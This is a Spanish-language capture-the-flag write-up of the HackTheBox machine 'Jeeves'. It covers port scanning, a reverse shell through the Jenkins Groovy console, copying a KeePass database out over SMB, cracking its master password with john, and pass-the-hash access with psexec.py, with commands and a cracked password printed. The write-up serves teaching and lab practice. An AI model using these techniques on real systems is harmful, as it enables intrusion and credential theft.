@@ -1,0 +1,604 @@
+---
+layout      : post
+title       : "HackTheBox - Jeeves"
+author      : lanz
+image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114banner.png
+category    : [ htb ]
+tags        : [ ADS, jenkins, .kdbx, groovy, askjeeves, kpcli ]
+---
+Máquina Windows nivel medio. La elegancia de **Jenkins** que nos permite jugar con scripts de **Groovy** para obtener **RCE** :O Archivos **.kdbx** con contraseñas dentro (¿qué puede pasar?) y descubriremos objetos ocultos mediante los **Alternate Data Stream** (**ADS**).
+
+![114jeevesHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114jeevesHTB.png)
+
+## TL;DR (Spanish writeup)
+
+**Creada por**: [mrb3n](https://www.hackthebox.eu/profile/2984).
+
+Vamos a estar muy elegantes.
+
+Empezaremos con un servidor web algo preguntón, nos moveremos a otro más calmadito con el que fuzzearemos directorios para encontrar recursos fuera de nuestra vista. Llegaremos a un servidor `Jenkins` bastaaaaante interesante. Usaremos su consola de scripts para ejecutar código -interesante- del lenguaje de programación `Groovy`. Finalmente obtendremos una **Reverse Shell** como el usuario `kohsuke`.
+
+Estando en el sistema encontraremos un archivo `.kdbx` (**KeePass Database**) que contiene tooooooodas las contraseñas guardadas por **kohsuke**, pero para poder verlas necesitamos una contraseña -maestra-, jugaremos con `keepass2john` y `john` para crackear la credencial maestra, esto para obtener acceso completo a la base de datos con la herramienta `kpcli`.
+
+Una de las contraseñas contiene un backup de unos hashes al dumpear la `SAM`, con ayuda de `psexec` lograremos probarlos contra el usuario `Administrator` y obtener una **terminal** en el sistema como el usuario `nt authority\system`.
+
+Y tendremos que hacer un pequeño movimiento con los `Alternate Data Stream` para encontrar la flag `root.txt` oculta en un archivo.
+
+...
+
+### Clasificación de la máquina según la gentesita
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>
+
+Algunas vulns conocidas y cositas reales.
+
+> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.
+
+...
+
+En las noches frías.
+
+1. [Reconocimiento](#reconocimiento).
+  * [Enumeración de puertos con nmap](#enum-nmap).
+2. [Enumeración](#enumeracion).
+  * [Recorremos el puerto 80](#puerto-80).
+  * [Recorremos el puerto 50000](#puerto-50000).
+  * [Encontramos servidor **Jenkins** en el puerto **50000**](#web-jenkins-found).
+3. [Explotación](#explotacion).
+  * [Usamos instrucciones del lenguaje **Groovy** para ejecutar comandos en el sistema](#jenkins-groovy-scripts).
+  * [Intentamos desencriptar los secretos de **Jenkins**](#decrypt-jenkins-secrets).
+4. [Escalada de privilegios](#escalada-de-privilegios).
+  * [Jugamos con el archivo **KeePass** y obtenemos **master password** de la base de datos](#keepass2john).
+  * [Vemos credenciales del gestor **KeePass**](#keepass-cracked).
+  * [Usamos **psexec** para obtener una **terminal** usando **hashes almacenados en la <u>.kdbx</u>](#psexec).
+5. [Vemos que la flag esta oculta con un **Alternate Data Stream**](#ads).
+
+...
+
+# Reconocimiento [#](#reconocimiento) {#reconocimiento}
+
+...
+
+## Enumeración de puertos con nmap [📌](#enum-nmap) {#enum-nmap}
+
+Empezaremos viendo que puertos tiene abiertos la máquina, así vamos direccionando nuestro research, usaremos `nmap`:
+
+```bash
+❱ nmap -p- --open -v 10.10.10.63 -oG initScan
+```
+
+| Parámetro | Descripción |
+| --------- | :---------- |
+| -p-       | Escanea todos los 65535                      |
+| --open    | Solo los puertos que están abiertos          |
+| -v        | Permite ver en consola lo que va encontrando |
+| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |
+
+El escaneo nos devuelve:
+
+```bash
+❱ cat initScan
+# Nmap 7.80 scan initiated Tue Aug 17 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.63
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.63 ()	Status: Up
+Host: 10.10.10.63 ()	Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///, 445/open/tcp//microsoft-ds///, 50000/open/tcp//ibm-db2///	Ignored State: filtered (65531)
+# Nmap done at Tue Aug 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 204.57 seconds
+```
+
+| Puerto | Descripción |
+| ------ | :---------- |
+| 80      | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Nos ofrece un servidor web. |
+| 135/445 | **[SMB](https://ayudaleyprotecciondatos.es/2021/03/04/protocolo-smb/)**: Protocolo para compartir información entre dispositivos de una red. |
+| 50000   | ibm-db2: No sabemos aún que esta sirviendo el puerto en concreto. |
+
+Bien, ahora que sabemos que puertos hay, vamos a profundizar un poco más y descubrir que scripts y versiones están siendo mantenid@s por cada servicio:
+
+**~(Usando la función `extractPorts` (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno**
+ 
+```bash
+❱ extractPorts initScan 
+[*] Extracting information...
+
+    [*] IP Address: 10.10.10.63
+    [*] Open ports: 80,135,445,50000
+
+[*] Ports copied to clipboard
+```
+
+**)~**
+
+```bash
+❱ nmap -p 80,135,445,50000 -sC -sV 10.10.10.63 -oN portScan
+```
+
+| Parámetro | Descripción |
+| --------- | :---------- |
+| -p        | Escaneo de los puertos obtenidos                       |
+| -sC       | Muestra todos los scripts relacionados con el servicio |
+| -sV       | Nos permite ver la versión del servicio                |
+| -oN       | Guarda el output en un archivo                         |
+
+Y este escaneo nos muestra:
+
+```bash
+❱ cat portScan
+# Nmap 7.80 scan initiated Tue Aug 17 25:25:25 2021 as: nmap -p 80,135,445,50000 -sC -sV -oN portScan 10.10.10.63
+Nmap scan report for 10.10.10.63
+Host is up (0.11s latency).
+
+PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Ask Jeeves
+135/tcp   open  msrpc        Microsoft Windows RPC
+445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
+|_http-server-header: Jetty(9.4.z-SNAPSHOT)
+|_http-title: Error 404 Not Found
+Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 5h05m37s, deviation: 0s, median: 5h05m36s
+|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
+| smb-security-mode: 
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-08-17T21:40:02
+|_  start_date: 2021-08-17T21:30:10
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Aug 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 48.15 seconds
+```
+
+Cositas relevantes:
+
+| Puerto | Servicio | Versión |
+| :----- | :------- | :------ |
+| 80     | HTTP     | 
+
+* Vemos `Ask Jeeves`, es curioso, pero no tenemos aún certeza de que es.
+
+---
+
+| Puerto | Servicio | Versión |
+| 50000  | HTTP     | Jetty 9.4.z-SNAPSHOT |
+
+Esa versión suena locochona, tengámosla en cuenta para más adelante, por ahora no vemos nada más, sigamos.
+
+...
+
+# Enumeración [#](#enumeracion) {#enumeracion}
+
+...
+
+## Puerto 80 [📌](#puerto-80) {#puerto-80}
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+Lindo, encontramos el logo del famoso [Ask](https://es.wikipedia.org/wiki/Ask.com) (que su nombre original es `Ask Jeeves`), encargado de hacer búsquedas en internet (es como un **Google**), así que contamos con un motor de búsqueda como primera medida.
+
+Existe un campo en el que podemos escribir cositas para ser buscadas, pero con cualquier término nos redirige al recurso `error.html`:
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page80_SourceHTML_link2errorHTML.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+Y ese recurso tiene esta imagen:
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page80_errorHTML_SourceHTML.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page80_errorHTML_jeevesPNG.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+De ella podemos destacar varias cositas:
+
+* `Microsoft SQL Server 2005 - 9.00.4053`.
+* Una ruta de los archivos de la web: `c:\webroot\Sock_Puppets\...`.
+* Y al final unas versiones, tanto de `.NET` como de `ASP.NET`.
+
+No sabemos si esto nos sirva de algo (por la fecha que tiene el error) pero podemos guardarlo (:
+
+---
+
+## Puerto 50000 [📌](#puerto-50000) {#puerto-50000}
+
+Revisando el servicio del puerto `50000` encontramos esto:
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+Volvemos a ver la referencia hacia `Jetty 9.4.z-SNAPSHOT`, así que busquemos de que trata...
+
+🚏🚏🚏 ***`Jetty` es un servidor web y contenedor de <u>Servlets</u> (clases que ayudan a ampliar las capacidades de un servidor) que se enfoca <u>100%</u> en `Java`.***
+
+Bien, buscando vulnerabilidades relacionadas con la versión `9.4.z-SNAPSHOT` o `9.4` caemos en este post:
+
+* [Critical Jenkins Server Vulnerability - (CVE-2019-17638)](https://www.davosnetworks.com/critical-jenkins-server-vulnerability-cve-2019-17638).
+
+🚀 ***"Jenkins, the open-source automation server software, had a critical vulnerability (CVE-2019-17638) in the `Jetty` web server that allowed the leakage of users confidential data.***" [davosnetworks](https://www.davosnetworks.com/critical-jenkins-server-vulnerability-cve-2019-17638).
+
+OJOOOOooklajsdlñf ¿qué es Jenkins? ¿? ¿? rápidamenteeeeeee...
+
+La idea de **Jenkins** es supervisar tooooooodas las tareas repetitivas que se realizan en un proyecto, peeeeeero lo hace él, eso evita a los programadores estar revisando y revisando problemas o temas relacionados con el código. Su definición es sencilla: ***servidor automatizado de integración continua***.
+
+Les dejo este excelente post donde se habla de que es **Jenkins** y **la integración continua**:
+
+* [¿Qué es Jenkins?, Herramienta de Integración Continua](https://ciberninjas.com/jenkins/).
+
+Bien, peeeeeeeeeeeeeeero no podemos hacer nada con esa vulnerabilidad que encontramos, ya que tenemos el servidor **Jetty** pero no el servidor **Jenkins**.
+
+...
+
+## Encontramos servidor <u>Jenkins</u> en el puerto <u>50000</u> [📌](#web-jenkins-found) {#web-jenkins-found}
+
+Después de estar probando cositas, encontramos algo llamativo al fuzzear directorios que la web sostiene, pero fuera de nuestra vista.
+
+Usaremos `wfuzz` pasándole 20 hilos, el wordlist que usara y en que parte la **URL** queremos que pruebe cada línea:
+
+```bash
+❱ wfuzz -c --hc=404 -t 20 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.63:50000/FUZZ
+...
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                        
+=====================================================================
+
+000041607:   302        0 L      0 W        0 Ch        "askjeeves"
+...
+```
+
+Súper leeeeeeejos (el archivo tiene más de 200k líneas) encontró un recurso llamado `askjeeves` (que se relaciona con nuestro servicio en el puerto **80**), es un redirect, pero veámoslo a ver a donde nos lleva:
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+Pos si, tamos en la interfaz del servidor `Jenkins`, lo primero llamativo a la vista fue la versión que esta abajo a la derecha: `Jenkins 2.87`, esto nos abre una nueva puerta para buscar vulns.
+
+...
+
+# Explotación [#](#explotacion) {#explotacion}
+
+Indagando un poco en las opciones que nos brinda el servidor, vemos en la parte izquierda una tuerca y el texto `Manage Jenkins`, si damos clic recibimos:
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manageList1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manageList2.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+Hay varios apartados interesantes, pero de toooooooooodos hay dos muuuuy llamativos: `System Information` (info del entorno donde esta montado **Jenkins**) y `Script Console` (permite ejecutar scripts).
+
+🚆 **System Information**:
+
+Uff bastantes cositas... Pero lo más relevante sería esto:
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manage_systemInfo.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+Tenemos dos usuarios del sistema y vemos la ruta donde esta el ejecutable de `Jenkins` (que esta en una de las carpetas del usuario **Administrator**).
+
+🚆 **Script Console**:
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manage_scriptConsole.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+Él mismo nos informa que podemos escribir ahí:
+
+> Type in an **arbitrary `Groovy script` and execute it** on the server.
+
+---
+
+## Jugamos con scripts de <u>Groovy</u> para ejecutar comandos en el sistema [📌](#jenkins-groovy-scripts) {#jenkins-groovy-scripts}
+
+⛰️ ***Groovy es un lenguaje de programación orientado a objetos implementado sobre la plataforma Java. Groovy usa una sintaxis muy parecida a Java, comparte el mismo modelo de objetos, de hilos y de seguridad.*** [Wikipedia](https://es.wikipedia.org/wiki/Groovy_(lenguaje_de_programaci%C3%B3n)).
+
+Buscando como usar la consola o ejemplos del lenguaje `Groovy`, encontramos este recurso:
+
+* [Exploiting Jenkins Groovy Script Console in Multiple Ways](https://www.hackingarticles.in/exploiting-jenkins-groovy-script-console-in-multiple-ways/).
+
+El post nos provee directamente un payload para obtener una **Reverse Shell**, lo extrae de este otro recurso:
+
+* [https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76).
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114google_gist_groovyRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+Antes de intentarlo quería mostrarles este otro código, con él podemos ejecutar comandos en el sistema y ver su respuesta:
+
+* [https://gist.github.com/katta/5465317](https://gist.github.com/katta/5465317).
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114google_gist_groovyCommands.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+Probémoslo pero con el comando `whoami` a vel:
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manage_scriptConsole_RCE_whoami.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+Liiiistooones, el usuario que esta ejecutando el servicio **Jenkins** se llama `kohsuke` yyyy ya tendríamos ejecución remota de comandos (:
+
+Ese ejemplo me gusto porque es muy sencillo de interpretar. Ahora si intentemos generar la **Reverse Shell**.
+
+Nos ponemos en escucha por el puerto en el que queremos recibirla, en mi caso en el `4433`:
+
+```bash
+❱ nc -lvp 4433
+```
+
+Y ahora en la consola de scripts ejecutaríamos:
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manage_scriptConsole_tryingRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+Le indicamos que nos envíe una petición hacia nuestro puerto `4433` y que cuando la establezca nos ejecute una `cmd.exe` (terminal).
+
+Damos clic en `Run` yyyyyyyyyyy:
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_kohsukeRevSH_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+TAMOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO!! Conseguimos la reverse **Shell** como el usuario `kohsuke` y estamos en el sistema (:
+
+...
+
+Con este script logramos una Shell en la misma ejecución del programa:
+
+> [jenkins_pwn_shell.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/jeeves/jenkins_pwn_shell.py)
+
+---
+
+## Intentamos desencriptar los secretos de <u>Jenkins</u> [📌](#decrypt-jenkins-secrets) {#decrypt-jenkins-secrets}
+
+Nuestra primera impresión al ejecutar `dir` es ver muuuuuuuucho archivos, uno con un nombre llamativo (`secret.key`) que me hizo volver a un recurso que había desechado:
+
+* [https://github.com/gquere/pwn_jenkins](https://github.com/gquere/pwn_jenkins#files-to-copy-after-compromission).
+
+Habla de los 🤫 secretos de **Jenkins** 😶 y lo necesario para desencriptarlos, que serian dos archivos:
+
+* `secrets/master.key`.
+* `secrets/hudson.util.Secret`.
+
+Peeero si bajamos un poquito más [vemos que podemos intentar desencriptarlos](https://github.com/gquere/pwn_jenkins#decrypt-jenkins-secrets-from-groovy) con el propio `Groovy` y sus comandos, pues aprovechemos la consola que tenemos para interactuar con eso...
+
+Simplemente debemos pasarle el secreto:
+
+```groovy
+println(hudson.util.Secret.decrypt("{...}"))
+```
+
+Leyendo [acá](https://gist.github.com/tuxfight3r/eca9442ff76649b057ab) entendemos el porqué hay unos `{}` en el ejemplo de arriba, ellos hacen parte del secreto, por lo que en caso de encontrar algún secreto para lograr desencriptarlo debemos agregar los `{}` también...
+
+Enumerando las carpetas vemos el archivo `config.xml` en la ruta `..\Administrator\.jenkins\users\admin`; en su contenido hay un **token** entre `{}`:
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_kohsukeRevSH_adminConfigXML_token.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+Pues probemos la dezencryptazhion:
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manage_scriptConsole_ApiToken_decrypt.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+Nos devuelve un **hash** y ese sería la flag que va en `root.txt` (: Y iaaaaaaaaa, eso es todo por esta máquina, veamos la flag del `user.txt`:
+
+E.E noup, ese **hash** debe ser el `token` del **API** en texto plano, pero ¿nos sirve esto para algo? Por ahora no (no creo que sirva tampoco después), pero aprendimos e.e
+
+...
+
+# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}
+
+Enumerando las carpetas de `kohsuke` encontramos una base de datos de contraseñas en `Documents`:
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_kohsukeSH_dirDocuments.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+Por si no conoces los archivos **.kdbx**:
+
+🔐 ***Un objeto con la extensión `.kdbx` es un archivo <u>KeePass Password Database</u>, la finalidad de estos archivos es almacenar y proteger un grupo de contraseñas de manera segura. Para acceder a la base de datos se necesita una contraseña -madre- o -maestra- que es la encargada de securizar toooooodas las demás contraseñas.***
+
+Más info **KeePass** y **.kdbx**:
+
+* [KeePass](https://es.wikipedia.org/wiki/KeePass).
+* [Opening KDBX Files](https://filext.com/file-extension/KDBX).
+
+...
+
+## Jugamos con el archivo <u>.kdbx</u> y obtenemos <u>master password</u> [📌](#keepass2john) {#keepass2john}
+
+Existe una herramienta llamada [kpcli](http://kpcli.sourceforge.net/) con la cual podemos jugar para interactuar con la base de datos, pero primero pasémonos el archivo a nuestro sistema:
+
+```powershell
+c:\\Users\kohsuke\Documents>copy CEH.kdbx \\10.10.14.2\smbFolder\CEH.kdbx
+```
+
+```bash
+❱ file CEH.kdbx 
+CEH.kdbx: Keepass password database 2.x KDBX
+```
+
+Esta este excelente tutorial del que nos guiaremos para leer la base de datos:
+
+* [How To Use kpcli To Manage KeePass2 Password Files](https://www.digitalocean.com/community/tutorials/how-to-use-kpcli-to-manage-keepass2-password-files-on-an-ubuntu-14-04-server).
+
+Ejecutamos la herramienta y le indicamos que vamos a usar el archivo `.kdbx`:
+
+```bash
+❱ kpcli 
+```
+
+```bash
+kpcli:/> open CEH.kdbx 
+Please provide the master password:
+```
+
+Jmmmm, lo que habíamos dicho antes, por lo general es necesaria una password maestra... Al colocar cualquier cosa obtenemos:
+
+> <span style="color: yellow;">Couldn't load the file CEH.kdbx: The database key appears invalid or else the database is corrupt.</span>
+
+F, F, F...
+
+Dando algunas vueltas encontramos este recurso:
+
+* [Cracking KeePass Database](https://tzusec.com/tag/keepass2john/).
+
+En él se usa la herramienta `keepass2john` la cual obtiene un hash que hace referencia a la **master password**, depende de que tan fuerte sea para evitar ser crackeada (:
+
+Asíííííí que obtengamos el hash e intentemos crackearlo:
+
+```bash
+❱ keepass2john CEH.kdbx
+CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
+```
+
+Peeerfecto, guardémoslo en un archivo:
+
+```bash
+❱ keepass2john CEH.kdbx > CEH.txt
+```
+
+Y ahora simplemente se lo pasamos a `John The Ripper` (que es un **crack**eador de contraseñas):
+
+```bash
+❱ john --wordlist=/usr/share/wordlists/rockyou.txt CEH.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 6000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
+Press 'q' or Ctrl-C to abort, almost any other key for status
+moonshine1       (CEH)
+1g 0:00:01:09 DONE (2021-08-17 19:32) 0.01443g/s 793.5p/s 793.5c/s 793.5C/s moonshine1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+
+¿KHE ZE BE POR AY? Tenemos la ***master password*** en texto planooooooooooooooooo. 
+
+Pos volvamos a cargar la base de datos y le pasamos esa pw:
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_kpcli_openDB_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+Ahora síííííííí, pos retomemos el [tutorial de antes](https://www.digitalocean.com/community/tutorials/how-to-use-kpcli-to-manage-keepass2-password-files-on-an-ubuntu-14-04-server) y exploremos...
+
+---
+
+## Vemos credenciales del gestor <u>KeePass</u> [📌](#keepass-cracked) {#keepass-cracked}
+
+Como bien dice el post, la interacción es muy parecida a la de los comandos `*nix`, pero claramente no opera sobre el sistema sino sobre la estructura que tiene la base de datos:
+
+```bash
+kpcli:/> ls
+=== Groups ===
+CEH/
+```
+
+Existe un grupo (que sería un apartado para organizar las distintas contraseñas), entremos en él:
+
+```bash
+kpcli:/> cd CEH/
+kpcli:/CEH> ls
+=== Groups ===
+eMail/
+General/
+Homebanking/
+Internet/
+Network/
+Windows/
+=== Entries ===
+0. Backup stuff                                                           
+1. Bank of America                                   www.bankofamerica.com
+2. DC Recovery PW                                                         
+3. EC-Council                               www.eccouncil.org/programs/cer
+4. It's a secret                                 localhost:8180/secret.jsp
+5. Jenkins admin                                            localhost:8080
+6. Keys to the kingdom                                                    
+7. Walmart.com                                             www.walmart.com
+```
+
+Vemos también algunos grupos, pero lo nuevo son las -entradas-, que serian las contraseñas que hay guardadas.
+
+Tenemos la descripción del usuario y el sitio al que pertenece esa credencial (hay dos bastante curiosas que hacen referencia a servicios locales (pero que no existen en el sistema :P)), por ejemplo si inspeccionamos la password del **banco de america** tendríamos esta estructura:
+
+> Podemos ya sea llamar el index de cada uno (0,1,2,3...) o su nombre (Bank of America, EC-Council...)
+
+---
+
+```bash
+kpcli:/CEH> show 1
+```
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_kpcli_show1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+La barra roja evita mostrar la contraseña a los ojitos, pero si copiamos el contenido y lo pegamos en cualquier otro sitio, vamos a ver la contraseña.
+
+Después de jugar con todas las entradas obtenemos:
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_kpcli_showALL.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+---
+
+## Obtenemos terminal usando <u>hashes</u> y <u>psexec.py</u> [📌](#psexec) {#psexec}
+
+Hay algunas contraseñas mooooooy llamativas, pero lo que más me llamo la atención fue la contraseña del index `0`, me recordó a cuando se dumpea la [SAM](https://en.wikipedia.org/wiki/Security_Account_Manager) (archivo que contiene las contraseñas de los usuarios del sistema), ya que tienen el mismo formato, adjunto prueba e.e
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114google_dumpSAM.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+> Tomada de [packtpub - dumping-the-contents-of-the-sam-database](https://subscription.packtpub.com/book/networking-and-servers/9781788623179/5/ch05lvl1sec76/dumping-the-contents-of-the-sam-database).
+
+Si nos fijamos es igualito, si a nuestra credencial le agregamos al inicio un nombre de usuario queda igual, así que pueda que tengamos un hash de la **SAM**.
+
+Lo bueno de tener esto es que podemos usarlas como -contraseñas- (:
+
+Usemos `psexec` (herramienta para acceder remotamente a un host) para probar el ingreso con los hashes:
+
+```bash
+❱ psexec.py Jeeves/Administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+```
+
+Le pasamos el hostname (`Jeeves`), el usuario (inicialmente probamos con `Administrator`) el host y finalmente los hashes, ejecutamos yyyyyyyyy:
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_psexec_NTauthoritySYSTEM_SH_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+LKAÑÑÑÑÑsdfñlñÑsjdflkasjdflkajsoiJAODIafjsid VAMOOOOOOOOOOO!! Tamos en el sistema como el usuario `nt authority\system`.
+
+---
+
+# Extraemos la flag <u>root.txt</u> de un <u>ADS</u> [📌](#ads) {#ads}
+
+Veamos las flags:
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_NTsysSH_dirAdministratorDesktop.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_NTsysSH_type_hmTXT.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+Pos no, aún no vamos a ver flags ¯\\_(ツ)_/¯, tenemos que buscar el objeto `root.txt`... 
+
+Nos indica que -veamos profundamente-, jmmm.
+
+Lo primero que se ocurrió fue que podría estar oculto en alguna ruta del sistema pero neeeeeeelson:
+
+```powershell
+c:\>powershell -c Get-ChildItem -Path C:\ -Filter root.txt -Recurse -ErrorAction SilentlyContinue -Force
+```
+
+Lo siguiente que iba a hacer era complicarme con ese `.lnk` extraño del directorio `Desktop`, peeeeeeeeero al momento pensé en intentar buscar archivos ocultos pero dentro de los mismos archivos existentes :o lo también llamado `Alternate Data Stream`, que seria ocultar información dentro de archivos.
+
+Les dejo un artículo que hice en su tiempo profundizando a tope en los **ADS**:
+
+* [Ocultando data en archivos de Windows (con ADS)](https://lanzt.github.io/blog/article/ADS-Windows).
+
+Podemos probar inicialmente con `dir /r`:
+
+👁️‍🗨️ ***Display alternate data streams of the file.*** [docs.microsoft](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dir).
+
+A veeeeeeeeeer:
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_NTsysSH_dirR_ADSfound.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+OJOOOOO, existe un archivo oculto dentro de `hm.txt` llamado `root.txt`, o sea, la flag (: pues veamos su contenido:
+
+Usaremos el comando `more` para revelar el contenido del **ADS**, de manera normal:
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_NTsysSH_moreNormal.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+Y ahora referenciando el **ADS**:
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+
+Ya tendríamos las flags de la máquina (:
+
+Y finaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaal :^D
+
+...
+
+Bonita máquina, primer acercamiento contra un servidor **Jenkins** y todas sus locuras. El tema de **KeePass** me gusto bastante también. El **ADS** no me exploto la cabeza porque ya los conocía, pero son muy lindos jajaj.
+
+Meno, nos leeremos otro día, que estés bien y como siempre, a seguir rompiendo de tooooooooooooodo!!
